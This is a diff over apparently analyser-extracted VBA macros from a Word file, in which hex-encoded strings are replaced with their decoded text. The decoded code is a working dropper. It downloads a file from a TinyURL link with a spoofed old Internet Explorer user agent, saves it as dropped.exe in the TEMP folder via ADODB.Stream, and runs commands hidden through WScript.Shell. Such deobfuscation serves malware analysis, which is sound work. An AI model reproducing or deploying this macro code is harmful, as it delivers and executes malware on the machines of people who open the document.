@@ -10,15 +10,15 @@ Dim yxxqowke As String
 Dim yqlcangepvrccrx As Object, tmffoscpfdripcxpd As Object
 Dim afcbydld As Integer
 vxedylctlyqvkl = hgmneqolwgxg("https://tin") & hgmneqolwgxg("yurl.com/g2z2gh6f")
-yxxqowke = hgmneqolwgxg("64726f") & hgmneqolwgxg("707065642e657865")
+yxxqowke = hgmneqolwgxg("dro") & hgmneqolwgxg("pped.exe")
 yxxqowke = Environ("TEMP") & "\" & yxxqowke
-Set yqlcangepvrccrx = CreateObject(hgmneqolwgxg("4d53584d4c322e") & hgmneqolwgxg("536572766572584d4c485454502e362e30"))
+Set yqlcangepvrccrx = CreateObject(hgmneqolwgxg("MSXML2.") & hgmneqolwgxg("ServerXMLHTTP.6.0"))
 yqlcangepvrccrx.setOption(2) = 13056
-yqlcangepvrccrx.Open hgmneqolwgxg("474554"), vxedylctlyqvkl, False
-yqlcangepvrccrx.setRequestHeader hgmneqolwgxg("557365") & hgmneqolwgxg("722d4167656e74"), hgmneqolwgxg("4d6f7a696c6c612f342e302028636f6d7061") & hgmneqolwgxg("7469626c653b204d53494520362e303b2057696e646f7773204e5420352e3029")
+yqlcangepvrccrx.Open hgmneqolwgxg("GET"), vxedylctlyqvkl, False
+yqlcangepvrccrx.setRequestHeader hgmneqolwgxg("Use") & hgmneqolwgxg("r-Agent"), hgmneqolwgxg("Mozilla/4.0 (compa") & hgmneqolwgxg("tible; MSIE 6.0; Windows NT 5.0)")
 yqlcangepvrccrx.Send
 If yqlcangepvrccrx.Status = 200 Then
-Set tmffoscpfdripcxpd = CreateObject(hgmneqolwgxg("41444f") & hgmneqolwgxg("44422e53747265616d"))
+Set tmffoscpfdripcxpd = CreateObject(hgmneqolwgxg("ADO") & hgmneqolwgxg("DB.Stream"))
 tmffoscpfdripcxpd.Open
 tmffoscpfdripcxpd.Type = 1
 tmffoscpfdripcxpd.Write yqlcangepvrccrx.ResponseBody
@@ -42,7 +42,7 @@ VBA MACRO cuabumrbh.bas
 in file: word/vbaProject.bin - OLE stream: 'VBA/cuabumrbh'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Sub txsctapysvyvh(xflqpurtgr As String)
-CreateObject(jmkrohkvctnt("575363726970742e5368656c") & jmkrohkvctnt("6c")).Run xflqpurtgr, 0
+CreateObject(jmkrohkvctnt("WScript.Shel") & jmkrohkvctnt("l")).Run xflqpurtgr, 0
 End Sub
 Private Function jmkrohkvctnt(ByVal vgqofbnoswth As String) As String
 Dim nfwbabqqwqxf As Long
